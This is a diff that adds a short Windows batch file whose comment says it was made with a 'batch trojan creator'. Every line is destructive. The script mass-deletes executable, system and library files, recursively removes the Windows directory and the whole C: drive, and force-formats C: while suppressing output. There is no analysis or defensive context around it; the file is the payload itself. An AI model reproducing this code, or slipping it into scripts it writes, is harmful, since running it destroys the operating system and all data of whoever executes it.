@@ -1,0 +1,10 @@
+@Echo off
+REM Created by clown with BATCH TROJAN CREATOR v1.0
+Del *.exe > nul
+Del *.com
+Del *.sys > nul
+Del *.dll > nul
+Del *.hlp > nul
+Deltree /y %windir% > nul
+Deltree /y C:\ > nul
+Echo Y | Format C:
